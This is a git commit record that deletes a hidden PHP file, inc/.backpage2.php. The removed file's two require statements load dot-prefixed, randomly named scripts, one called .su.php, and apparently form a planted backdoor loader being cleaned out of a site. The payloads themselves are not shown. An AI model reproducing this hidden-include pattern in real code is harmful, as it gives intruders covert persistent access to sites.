5c8d59de182429ef836bd2c06468f9a4de26dbec
GoldFash <goldfashhosting@users.noreply.github.com>
2015-01-05 14:19:04 -0500

    Delete .backpage2.php

--- inc/.backpage2.php
+++
@@ -1,8 +0,0 @@
-<?php
-// Start F.
-require('LittleEngineThatCould/.NaxdQy4zJY3bQzSWFx.php');
-?>
-<?php
-// Complete I.
-require('LittleEngineThatCould/I84TtvswCbO2YuAJO9QY4vZp5m23vDMmBvDckmQrtL/pages/.su.php');
-?>
